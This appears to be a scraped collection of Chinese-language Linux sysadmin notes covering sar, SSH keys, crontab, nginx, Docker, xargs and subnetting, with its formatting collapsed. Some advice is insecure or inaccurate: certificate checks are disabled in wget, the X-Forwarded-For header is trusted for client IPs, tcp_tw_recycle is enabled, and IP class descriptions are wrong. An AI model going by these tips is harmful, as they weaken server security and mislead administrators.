lvinkim 0.00 B/s 3.95 K/s 0.00 % 0.00 % php-fpm: pool www\ 1 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % init可以看到不同任务的读写强度。六、sysstat 工具很多时候当检测到或者知道历史的高负载状况时，可能需要回放历史监控数据，这时 sar 命令就派上用场了，sar 命令同样来自 sysstat 工具包，可以记录系统的 CPU 负载、I/O 状况和内存使用记录，便于历史数据的回放。sysstat 的配置文件在 /etc/sysconfig/sysstat 文件，历史日志的存放位置为 /var/log/sa\统计信息都是每 10 分钟记录一次，每天的 23:59 会分割统计文件，这些操作的频率都在 /etc/cron.d/sysstat 文件配置。\七、sar 命令使用 sar 命令查看当天 CPU 使用：$ sar\Linux 2.6.32-431.23.3.el6.x86_64 (szs01) 01/20/2017 _x86_64_ (1 CPU)\\10:50:01 AM CPU %user %nice %system %iowait %steal %idle\11:00:01 AM all 0.45 0.00 0.22 0.40 0.00 98.93\Average: all 0.45 0.00 0.22 0.40 0.00 98.93使用 sar 命令查看当天内存使用：$ sar -r\Linux 2.6.32-431.23.3.el6.x86_64 (szs01) 01/20/2017 _x86_64_ (1 CPU)\\10:50:01 AM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit\11:00:01 AM 41292 459180 91.75 44072 164620 822392 164.32\Average: 41292 459180 91.75 44072 164620 822392 164.32使用 sar 命令查看当天 IO 统计记录：$ sar -b\Linux 2.6.32-431.23.3.el6.x86_64 (szs01) 01/20/2017 _x86_64_ (1 CPU)\\10:50:01 AM tps rtps wtps bread/s bwrtn/s\11:00:01 AM 3.31 2.14 1.17 37.18 16.84\Average: 3.31 2.14 1.17 37.18 16.84https://learnku.com/articles/31718 秘钥登录123456789101112131415161718192021222324252627282930ssh-keygen -t rsa -C 'youxiang@aliyun.com'scp -P &lt;端口号&gt; ~/.ssh/id_rsa.pub &lt;用户名&gt;@&lt;ip地址&gt;:/home/id_rsa.pubcat /home/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys如果在 家目录 没有 .ssh 目录或 authorized_keys 文件，可以创建一下，并授予 authorized_keys 文件 600 权限ssh root@114.11.11.111vi ~/.ssh/configHost jd #自定义别名HostName 114.11.11.110 #替换为你的ssh服务器ip或domainPort 22 #ssh服务器端口，默认为22User root #ssh服务器用户名IdentityFile ~/.ssh/id_rsa #第一个步骤生成的公钥文件对应的私钥文件此时就可以使用 ssh jd 进行登录cd /etc/ssh/修改 SSH 的配置文件 vi sshd_configRSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys#AuthorizedKeysCommand none#AuthorizedKeysCommandRunAs nobody#默认PasswordAuthentication 为yes,即允许密码登录，改为no后，禁止密码登录PasswordAuthentication no 重启 ssh 服务systemctl restart sshd.servicehttps://learnku.com/articles/30438 生成二维码12345678910111213141516171819202122232425262728第一种方法： qrencode#安装，记得加epel yum源[root@localhost ~]# yum install libpng libpng-devel qrencode -y#格式Usage: qrencode [OPTION]... [STRING]OPTIONS：-o：输出的二维码文件名。如test.png。需要以.png结尾。-表示输出到控制台。-s：指定图片大小。默认为3个像素。-t：指定产生的图片类型。默认为PNG。可以是PNG/ANSI/ANSI256/ASCIIi/UTF8等。如果需要输出到控制台，可以用ANSI、ANSI256等STRING：可以是text、url等#使用注：输出的二维码图片大小取决于，内容的多少，且不能换行# 将“http://jinchuang.org”网址转换为二维码并保存在qrcode.png图片中[root@localhost ~]# qrencode -o qrcode.png "http://jinchuang.org"# 在终端下无法查看png图片，所以可以使用ANSI生成[root@localhost ~]# echo "your input words" | qrencode -o - -t ANSI# 也可以将需要转换的文字保存为xx.txt文件，之后再转换[root@localhost ~]# cat xx.txt | qrencode -o - -t ANSI第二种方法：[root@localhost ~]# printf "http://jinchuang.org" | curl -F-=\&lt;- qrenco.de es Kibana1234567891011121314151617181920212223242526272829303132333435[root@localhost ~]# cd /source[root@localhost source]# wget https://artifacts.elastic.co/downloads/kibana/kibana-5.6.0-linux-x86_64.tar.gz[root@localhost source]# tar xf kibana-5.6.0-linux-x86_64.tar.gz -C /elk/[root@localhost source]# cd /elk/[root@localhost elk]# mv kibana-5.6.0-linux-x86_64/ kibana#修改配置文件[root@localhost elk]# vim kibana/config/kibana.ymlserver.port: 5601server.host: "0.0.0.0"elasticsearch.url: "http://127.0.0.1:9200"#启动[root@localhost elk]# /elk/kibana/bin/kibana &amp;[1] 31948 log [05:53:04.064] [info][status][plugin:kibana@5.6.0] Status changed from uninitialized to green - Ready log [05:53:04.149] [info][status][plugin:elasticsearch@5.6.0] Status changed from uninitialized to yellow - Waiting for Elasticsearch log [05:53:04.190] [info][status][plugin:console@5.6.0] Status changed from uninitialized to green - Ready log [05:53:04.235] [info][status][plugin:metrics@5.6.0] Status changed from uninitialized to green - Ready log [05:53:04.435] [info][status][plugin:timelion@5.6.0] Status changed from uninitialized to green - Ready log [05:53:04.447] [info][status][plugin:elasticsearch@5.6.0] Status changed from yellow to green - Kibana index ready log [05:53:04.449] [info][listening] Server running at http://0.0.0.0:5601 log [05:53:04.452] [info][status][ui settings] Status changed from uninitialized to green - Ready#查看进程和端口[root@localhost elk]# ps -ef|grep kibanaroot 31948 31038 12 13:52 pts/3 00:00:04 /elk/kibana/bin/../node/bin/node --no-warnings /elk/kibana/bin/../src/cli[root@localhost elk]# netstat -lntp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:9100 0.0.0.0:* LISTEN 28361/grunt tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 14146/sshd https://me.jinchuang.org/archives/319.html 随机数生成12345678910111213(1) echo $(($RANDOM)) 通过系统环境变量(2) echo $RANDOM | md5sum|cut -c 1-8(3) openssl rand -base64 65 openssl产生随机数(4) date +%s%N 通过时间获取随机数(5) head /dev/urandom |cksum 设备随机数(6) cat /proc/sys/kernel/random/uuid uuid随机数(7) mkpasswd -l 12 -d 5 expect随机数，需要安装expect Elasticsearch 在 docker 和 CentOS 下的安装教程123456sudo docker pull docker.elastic.co/elasticsearch/elasticsearch:7.3.1sudo docker run -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" docker.elastic.co/elasticsearch/elasticsearch:7.3.1sudo docker run -itd -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" docker.elastic.co/elasticsearch/elasticsearch:7.3.1https://learnku.com/articles/33404 wget 命令提示 “use ‘–no-check-certificate12345678php -r "print_r(openssl_get_cert_locations());"可以看到证书的默认位置在 /etc/pki/tls/cert.pem，这是在安装 Apache 时自动生成的证书文件。如果你的目录里没有证书文件，使用下面的命令下载一个：$wget -c https://curl.haxx.se/ca/cacert.pem /tmp --no-check-certificate因为我系统上本来就有一个证书文件了，为了不影响原来的，我将新的证书文件下载到 /tmp 目录中。然后设置以下环境变量，使证书只在当前会话生效：export SSL_CERT_FILE=/tmp/cacert.pemhttps://learnku.com/articles/33549 docker12345678如果我们想在一台电脑上搭建各种开发环境：lnmp 环境，java 环境，nodejs，redis 集群，python 开发环境。显然，这些多的开发环境，如果集中在一台机器上构建，会让系统显得复杂，可能还会出现各种版本或依赖之间的不兼容。如果能将这些开发环境都独立开来，各个环境互相独立隔离，但又能互相通讯交互，相当于每个环境都是一个容器，这些容器可以独立提供服务，也能通信交互。docker 就是这样的容器技术。用官方术语描述 docker: Docker 是基于 Go 语言实现的开源容器项目，有效地将由单个操作系统管理的资源划分到孤立的组中，以更好地在孤立的组之间平衡有冲突的资源使用需求。通俗地理解：docker 能让你在一台物理机上构建出很多个轻量极的开发环境。https://learnku.com/articles/33670#reply108346 xargs 命令123456789101112131415161718192021222324echo命令就不接受管道传参。$ echo "hello world" | echoxargs命令的作用，是将标准输入转为命令行参数$ echo "hello world" | xargs echohello world$ echo "one two three" | xargs mkdir$ xargs# 等同于$ xargs echo-d参数可以更改分隔符。$ echo -e "a\tb\tc" | xargs -d "\t" echoa b c$ echo 'one two three' | xargs -p touchtouch one two three ?...上面的命令执行以后，会打印出最终要执行的命令，让用户确认。用户输入y以后（大小写皆可），才会真正执行。xargs特别适合find命令。有些命令（比如rm）一旦参数过多会报错"参数列表过长"，而无法执行，改用xargs就没有这个问题，因为它对每个参数执行一次命令。$ find . -name "*.txt" | xargs grep "abc"上面命令找出所有 TXT 文件以后，对每个文件搜索一次是否包含字符串abchttp://www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html 禁用 eval 函数12在 /etc/bashrc 里加入alias eval = 'echo' find 模拟 tree1$ find . -print | sed -e ``'s;[^/]*/;|____;g;s;____|; |;g' Shell 命令组合12345统计独立 IP 数量 awk '&#123;print $1&#125;' access.log | sort -n | uniq | wc -l查看某一时间段的 IP 访问量 grep "05/Apr/2019:0[1-9]" access.log | awk '&#123;print $1&#125;' | sort | uniq -c| sort -nr | wc -l查看访问最频繁的前 100 个 IP awk '&#123;print $1&#125;' access.log | sort -n | uniq -c | sort -rn | head -n 100访问 100 次以上的 IP awk '&#123;print $1&#125;' access.log | sort -n | uniq -c | awk '&#123;if($1 &gt; 100) print $0&#125;' | sort -rn查询某个 IP 的详细访问情况，按访问频率排序 grep '127.0.0.1' access.log | awk '&#123;print $7&#125;' | sort | uniq -c | sort -rn | head -n 100 Crontab 定时任务执行时的环境变量问题123456789101112131415161718不是在 root 用户下安装的 scrapy，是在 crawl 用户下，然后一开始没注意，应该是用 root 用户配置的定时任务，导致定时任务找不到 scrapy，这个可以理解。但是当我在 crawl 用户下，重新配置了爬虫，发现还是报同样的错误。 crontab -l # 通过这个命令，可以查看当前用户下的定时任务解决办法后来经过查阅得知，crontab 有自己的环境变量配置，在 /etc/crontab 文件中，并不会自动加载当前用户的环境变量。所以在执行命令之前，应该先配置好环境变量。所以在 crontab 用户下，执行命令前先载入环境变量，如下。 00 10 * * * source $HOME/.bash_profile &amp;&amp; $HOME/path/to/script;sh /home/crawl/exec_aqi.sh &amp; &gt; /dev/null 2&gt;&amp;如果直接修改 /etc/crontab 文件SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root00 10 * * * crawl sh /home/crawl/exec_aqi.sh &amp;https://zcdll.github.io/2018/01/30/own-crontab/ 终端技巧大集合12345678910111213141516171819202122232425262728293031323334# ‘&#123;&#125;’ 可用于匹配多个模式的文件名 ls &#123;*.sh,*.py&#125; #列出所有.sh和.py文件筛选匹配前后返回的行（例如 “bbo”）# return also 3 lines after matchgrep -A 3 'bbo'# return also 3 lines before matchgrep -B 3 'bbo'# return also 3 lines before and after matchgrep -C 3 'bbo'删除前 100 行（删除第 1-100 行）sed 1,100d filename删除带字符串的行 (例如： bbo)sed "/bbo/d" filename- case insensitive:sed "/bbo/Id" filename删除空行sed '/^\s*$/d'# 或sed '/^$/d'查找且删除find . -name "*.html"|xargs rm# when using a backtickrm `find . -name "*.html"`https://learnku.com/laravel/t/35317#replies 网络知识之 IP 与子网掩码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465IP 地址是一种在 Internet 上的给主机编址的方式，也称为网际协议地址。IP 地址是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。常见的 IP 地址，分为 IPv4 与 IPv6 两大类。主要介绍的是 IPv4 这一类。 IP 地址是一个 32 位的二进制数，但为了方便记忆，通常被分割为 4 个 "8 位二进制数"，并且用 "点分十进制" 表示为 a.b.c.d 的形式，其中 a,b,c,d 都是 0~255 之间的十进制整数。IP 地址分为五类，各类可容纳的地址数目不同：A 类保留给政府机构（0.0.0.0 到 127.255.255.255）B 类分配给中等规模的公司（128.0.0.0 到 191.255.255.255）C 类分配给任何需要的人（192.0.0.0 到 223.255.255.255）D 类用于组播（224.0.0.0---239.255.255.255）E 类用于实验（240.0.0.0---247.255.255.255）A、B、C 三类中 IP 地址 = 网络地址 + 主机地址，而 D、E 两类不区分网络地址和主机地址特殊说明：（1）A 类中的 10.X.X.X 是私有地址；127.X.X.X 是保留地址（2）B 类中的 172.16.0.0~172.31.255.255 是私有地址（3）C 类中的 192.168.X.X 是私有地址网络地址可以简单理解我们平时常说的网段主机地址则是在这个网段中不同设备的地址子网掩码只有一个作用，就是将一个 IP 地址划分成网络地址和主机地址两部分。（常见的掩码是由一连串 1 + 一连串 0 构成的，不过看网上资料也说 1 和 0 交替也是可以的）默认分配的子网掩码每段只有 255 或 0A 类的默认子网掩码 255.0.0.0B 类的默认子网掩码 255.255.0.0 C 类的默认子网掩码 255.255.255.0子网掩码与 IP 地址一样是 32 位地址，然后将 IP 地址与子网掩码进行与运算即可得到网络地址。例：IP地址为192.168.10.2，子网掩码为255.255.255.240。先将十进制转换成二进制：IP地址： 11000000 10101000 00001010 00000010子网掩码： 11111111 11111111 11111111 11110000进行与运算：－－－－－－－－－－－－－－－－－－－－－－－－－－ 11000000 10101000 00001010 00000000则可得其网络标识为192.168.10.0，主机标识为2。3. 掩码的不同表示形式已经说过了子网掩码也是 32 位的地址，那么开头的 25 怎么转化呢？25 的意思是网络号为 25，就代表连续的 25 个 1，然后剩下的用 0 补齐即 11111111 11111111 11111111 100000004. 包含的其他信息还是以这个信息为例：XX.XX.XX.128/25，我们还可以拿到什么信息呢？（1）主机号：主机号 + 网络号 = 32，32-25=7（2）网络地址：当 7 位主机号全为 0，也就是 XX.XX.XX.128（3）广播地址：当 7 位主机号全为 1，也就是 XX.XX.XX.255（4）可用地址数量：7 位主机号有 2^7 种结果，但是要去掉网络地址和广播地址，即：2^7-2=126 (这个也就是运维所说的一百多个 ip)https://learnku.com/articles/35666 ssh免密登录漏洞12345678[root@localhost ~]# ll .ssh/total 42944-rw-r--r-- 1 root root 43918390 Nov 6 2017 authorized_keys-rw-r--r-- 1 root root 3415 Apr 26 2019 known_hosts[root@localhost ~]# cat .ssh/known_hostsgit.coding.net,221.193.246.6 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHOWdwLpkos2CLli6DFvQ36yQE6Pe/PtFp3XwyirfZCIoGWnedaWI8zkJWVCs0wgOB9/urFepTDfV2wN49KGy1sl2/CCDEH2K/zeoEAZlTcBrhU17bwg1yMHCyJ7IM+zdLzItDEKYjgoWqVdUGK1dXQQlwt7GP4W7HqffelQQoVxOMoZ5N50MzD+nvV4y8iq0KwDQNy62iU4hui9ajCSVUDLu/06ucd5IojSI9keRIYAXvQf52TJ5EbvoBggp9RhjuWNEG8IhnPP6rzPS11Ocmwg/Hs打开 vi authorized_keys 并没有任何东西。然后我顺带把其它 /root/.ssh/ 下的四个文件都翻了一遍。才发现 known_hosts 文件中多了两个 IP 地址为新加坡的 ssh key https://learnku.com/articles/35888 crontab 指定用户123456789101112131415161718192021222324252627282930313233直接在 /etc/crontab 中编辑定时任务即可，加上用户名SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )## cron* * * * * www-data flock /tmp/flock1.lock -c 'timeout 200 /usr/local/bin/php /var/www/html/laravel/artisan command &gt;&gt; /home/log/laravel.log 2&gt;&amp;1'flock 用来防止重复执行，起到原子锁作用 timeout 表示这个脚本执行过长，咱就干死它，可以有效避免各种循环或长时间占用问题https://learnku.com/articles/35948* * * * * flock -xn /tmp/test.lock -c "timeout 200 php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1" 想 10s 执行一次怎么办？* * * * * php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1* * * * * ( sleep 10 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 20 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 30 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 40 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 )* * * * * ( sleep 50 ; php /home/app/email.php &gt;&gt; /home/log/test.log 2&gt;&amp;1 ) &gt; &gt;&gt;12345678910111213&gt; 表示覆盖追加&gt;&gt; 表示尾部追加这两个管道操作符，在执行期间发生错误时，是不会将错误输出写入后面的「文件」中的。在 Linux 系统中 0、1、2 分别表示不同的设备类型，其中0 标准输入设备，指键盘1 标准正确输出设备2 标准错误输出设备php artisan command &gt;&gt; /home/log/laravel.log 2&gt;&amp;1'上面命令的意思是将 php artisan command 的 标准正确输出 重定向到 laravel.log 文件。而后面的 2&gt;&amp;1 是表示将标注错误输出重定向到标准正确输出。从而达到错误输出和正确输出都记录在 laravel.log 文件中。 内网穿透1234https://serveo.net/λ ssh -R 80:localhost:3000 serveo.netForwarding HTTP traffic from https://habeo.serveo.netPress g to start a GUI session and ctrl-c to quit. ab 压力测试12345678910111213ab -n 2000 -c 1000 http://www.xxx.com/index.php需要调整内核参数以支持端口重用假如我现在使用的是 Linux 服务器，找到如下文件sudo vim /etc/sysctl.conf添加如下内容net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30kernel.printk = 7 4 1 7运行 sudo sysctl –p 生效https://learnku.com/articles/4765/simple-primary-stress-test https 证书注册工具12345apt-get install certbot python-certbot-nginxcertbot --nginxcertbot renew --dry-runhttps://certbot.eff.org/ linux卡顿怎么排查12345678ps -ef | grep php | awk '&#123;print $2&#125;' | xargs kill -9查看内存使用状况：free -g查看磁盘使用状况：df -h查看磁盘I/O使用：iostat -dx查看CPU使用：topawk '条件类型 1&#123;动作1&#125; 条件类型2&#123;动作2&#125; ...' filenameawk后面接两个引号并加上大括号来设置想要对数据进行的处理动作。https://tsmliyun.github.io/linux/%E4%B8%80%E6%AC%A1%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/ docker123456789101112131415161718curl -L "https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose[root@VM_0_11_centos html]# docker-compose versiondocker-compose version 1.24.1, build 4667896bdocker-py version: 3.7.3CPython version: 3.6.8OpenSSL version: OpenSSL 1.1.0j 20 Nov 2018 docker pull gogs/gogs [root@VM_0_11_centos html]# docker start gogs gogs [root@VM_0_11_centos html]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 1bd82406bba2 gogs/gogs "/app/gogs/docker/st…" 7 hours ago Up 7 hours 0.0.0.0:10022-&gt;22/tcp, 0.0.0.0:10080-&gt;3000/tcp gogs https://learnku.com/articles/34941 cURL error 28: Resolving timed out after 5515 milliseconds1234567891011121314151617181920212223242526272829303132$ cat /etc/resolv.conf不要手动修改 /etc/resolv.conf，因为此文件动态生成的，先看下文件：$ cat /etc/network/interfaces最后一行的 dns-nameservers 是我们的目标，开始修改：$ vi /etc/network/interfaces比较知名的公共 DNS 可以请问这里查看 https://www.ip.cn/dns.html ，这里选择 114 和 阿里的 DNS:auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 10.x.23.xxxnetmask 255.255.0.0gateway 10.x.0.xmtu 1454dns-nameservers 114.114.114.114 114.114.115.115 223.5.5.5最后面 dns-nameservers 是 DNS ，修改最后一行即可，修改完成后：$ ifdown eth0 &amp;&amp; sudo ifup eth0重启成功后，确认是否应用上：$ cat /etc/resolv.conf可以看到输出：# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)# DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTENnameserver 114.114.114.114nameserver 114.114.115.115nameserver 223.5.5.5https://learnku.com/ubuntu/t/32705 内存消耗最大的进程12345678910111213[root@VM_0_11_centos html]# ps aux --sort -rss | headUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 3367 0.0 3.9 523176 74068 ? Ssl Nov14 0:53 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sockps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head如果你只想查看命令名称而不是命令的绝对路径，请使用下面的 ps 命令格式。# ps -eo pid,ppid,%mem,%cpu,comm --sort=-%mem | head# top -c -b -o +%MEM | head -n 20 | tail -15如果你只想查看命令名称而不是命令的绝对路径，请使用下面的 top 命令格式。# top -b -o +%MEM | head -n 20 | tail -15https://cn.v2ex.com/t/619291# Nginx 负载均衡12345678910111213141516171819202122232425262728293031323334语法: upstream name &#123; ... &#125; 默认值: —上下文: httpupstream 指令当中包含server指令语法: server address [parameters]; 上下文: upstream例子:upstream backend &#123; server backend1.example.com:8081 weight=4 max_fails=2 fail_timeout=30s; server backend2.example.com:8080 weight=1;&#125;server &#123; location / &#123; proxy_pass http://backend; &#125;&#125;参数说明:weight=number 设定服务器的权重，默认是1，权重越大被访问机会越大，可以根据机器的配置情况来配置。max_fails=number 设定Nginx与服务器通信的尝试失败的次数。在fail_timeout参数定义的时间段内，如果失败的次数达到此值，Nginx就认为服务器不 可用。在下一个fail_timeout时间段，服务器不会再被尝试。 失败的尝试次数默认是1。默认配置时，http_404状态不被认为是失败的尝试。 可以通过指令proxy_next_upstream 和memcached_next_upstream来配置什么是失败的尝试。fail_timeout=time统计失败尝试次数的时间段。在这段时间中，服务器失败次数达到指定的尝试次数，服务器就被认为不可用。默认情况下，该超时时间是10秒。 backup标记为备用服务器。当主服务器不可用以后，请求会被传给这些服务器，配置这个指令可以实现故障转移。down 标记服务器永久不可用，可以跟ip_hash指令一起使用。https://learnku.com/articles/36737 Nginx 配置常用参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123# 配置用户或者组，默认为nobody nobody。#user www www; #Nginx开启的worker进程数，建议为CPU的核数#worker_processes 2; #指定nginx进程运行文件存放地址#pid /nginx/pid/nginx.pid;#指定日志路径，级别。这个设置可以放入全局块、http块、server块，级别以此为：debug|info|notice|warn|error|crit|alert|emergerror_log log/error.log debug; #可以在任意地方使用include指令实现配置文件的包含，类似于apache中的include方法，可减少主配置文件长度。include vhosts/*.conf;事件模块events &#123; #设置网路连接序列化，防止惊群现象发生，默认为on accept_mutex on; #默认: 500ms 如果一个进程没有互斥锁，它将延迟至少多长时间。默认情况下，延迟是500ms 。 accept_mutex_delay 100ms; #设置一个进程是否同时接受多个网络连接，默认为off multi_accept on; #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport，不建议设置，nginx会自行选择 #use epoll; #最大连接数，默认为512 worker_connections 1024;&#125;http 部分http &#123; #文件扩展名与文件类型映射表 include mime.types; # 默认文件类型，默认为text/plain default_type application/octet-stream; #取消服务日志 #access_log off; #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。 sendfile on; #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。 sendfile_max_chunk 100k; #连接超时时间，默认为75s，可以在http，server，location块。 keepalive_timeout 65; #开启gzip资源压缩 gzip on; # 负载均衡，详细可看了一篇文章：https://learnku.com/articles/36737 upstream blog &#123; server 192.167.20.19:8081; server 192.168.10.121:8080 weight=5; &#125; #设定请求缓冲 client_header_buffer_size 128k; large_client_header_buffers 4 128k; #上传文件的大小限制 默认1m client_max_body_size 8m; server &#123; #单连接请求上限次数。 keepalive_requests 120; #监听端口 listen 80; #监听地址 server_name blog.13sai.com; #设定日志格式 log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /data/logs/access.log main; # 根目录 root /www/web/public; # 定义错误提示页面 error_page 500 502 503 504 /50x.html; location /static/ &#123; #root与alias主要区别在于nginx如何解释location后面的uri，这会使两者分别以不同的方式将请求映射到服务器文件上。 #root的处理结果是：root路径＋location路径 #alias的处理结果是：使用alias路径替换location路径 alias /www/static/; #过期30天，静态文件不怎么更新，过期可以设大一点,如果频繁更新，则可以设置得小一点。 expires 30d; &#125; # 处理php请求到fpm端口 location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_pass http://blog; #请求转向blog 定义的服务器列表 &#125; #禁止访问文件 location ~ /.git &#123; deny all; allow 127.0.0.1; #允许的ip &#125; &#125;&#125; https://learnku.com/articles/36768 反向代理后如何获取真实客户端 IP12345678910111213141516location /api &#123; rewrite ^/api/(.*)$ /api/$1 break; proxy_pass https://***.*********.com; &#125; proxy_set_header X-Forwarded-For $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 如果有报错 Starting nginx: nginx: [warn] could not build optimal proxy_headers_hash, you should increase either proxy_headers_hash_max_size: 512 or proxy_headers_hash_bucket_size: 64; ignoring proxy_headers_hash_bucket_size nginx.conf 下的http 模块下设置 proxy_headers_hash_max_size 51200; proxy_headers_hash_bucket_size 6400; 3 代码里面获取 $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; https://learnku.com/articles/36832 docker 入门123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux 或 Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。docker images -- 常看本地镜像docker ps -- 查看容器，默认只查看已启动的，加入 "-a" 参数可以查看所有docker start|stop|rm|rmi -- 容器的相关操作，分别对应： 开启 | 停止 | 删除容器 | 删除镜像docker pull ubuntudocker run -itd --name test-ubuntu ubuntudocker exec -it test-ubuntu /bin/bashdocker pull php:7.3.5-fpmdocker run -itd -p 9001:9000 -v /Users/admin/Site/php7.3.5:/data --name php-test php:7.3.5-fpmdocker exec -it php-test /bin/bashvi /etc/nginx/config.d/php.confserver &#123; # 监听端口 listen 8002; # 域名设定 server_name 122.51.155.172; root /usr/share/nginx/html/php/; # 该项要修改为你准备存放相关网页的路径，如果存在fast-cgi的root字段，这里貌似就没效果了 location / &#123; index index.php index.html; # 打开目录浏览功能，可以列出整个目录 autoindex on; &#125; #proxy the php scripts to php-fpm location ~ \.php$ &#123; # fastcgi配置 # 指定是否传递4xx和5xx错误信息到客户端 fastcgi_intercept_errors on; # 指定FastCGI服务器监听端口与地址，可以是本机或者其它,这里是重点，需要指定php-fpm容器的端口和根目录 fastcgi_pass 127.0.0.1:9001; root /data; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; &#125;&#125;sysctemclt restart nginx vi /usr/share/nginx/html/php/inde.php 访问http://122.51.155.172:8002/Dockerfile 是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker 通过读取 Dockerfile 中的指令自动生成映像。FROM php:7.3.5-fpmMAINTAINER liyan#安装环境系统命令RUN apt-get update &amp;&amp; apt-get install -y \vim \libssl-dev#安装PHP扩展RUN pecl install igbinary \redis-4.0.2 \swoole#配置php.iniRUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini &amp;&amp; \ln -s /usr/local/etc/php/php.ini /etc/php.ini &amp;&amp; \echo "extension=igbinary.so\nextension=redis.so\nextension=swoole.so" &gt;&gt; /etc/php.iniEXPOSE 9300VOLUME ["/data"]WORKDIR /datahttps://learnku.com/articles/36739 忽略文件123456789101112已经推送 push 过的文件，想在以后的提交时忽略此文件，即使本地已经修改过，而且不删除 Git 远程库中相应文件，后面的 Xml/config.xml 是要忽略的文件的路径，执行命令：git update-index --assume-unchanged Xml/config.xml 恢复忽略的文件，执行命令：git update-index --no--assume-unchanged Xml/config.xml 如果要忽略一个目录，打开 git bash，定位到目标目录下，后面的 Xml/test/ 是要忽略的目录的路径，执行命令：git update-index --assume-unchanged $(git ls-files Xml/test/ | tr '\n' ' ')清除指定目录下没有被 push 过的文件和文件夹，执行命令：git clean -df supplier/web https://learnku.com/articles/37298 crontab %截断123456789100 0 * * * cd /home/vg/odp/log &amp;&amp; mv *`date -d "-10 day" "+%Y%m%d"`* archivescrontab的执行情况，linux都会给对应的用户发邮件，因此可以通过邮件来定位问题。上面的任务在vg用户下，查看对应的邮件 /var/spool/mail/vgSubject那一行：Subject: Cron cd /home/vg/odp/log &amp;&amp; mv *`date -d "-10 day" "+显示的命令不全，到加号就结束了，%和后面的部分丢失了，结合报错基本可以定位原因，%是crontab里的特殊符号，表示新的一行开始，所以前面的命令就被截断了。解决方式如果crontab执行的命令中包含%需要用\转义，上面的例字改成这样就可以成功执行：0 0 * * * cd /home/vg/odp/log &amp;&amp; mv *`date -d "-10 day" "+\%Y\%m\%d"`* 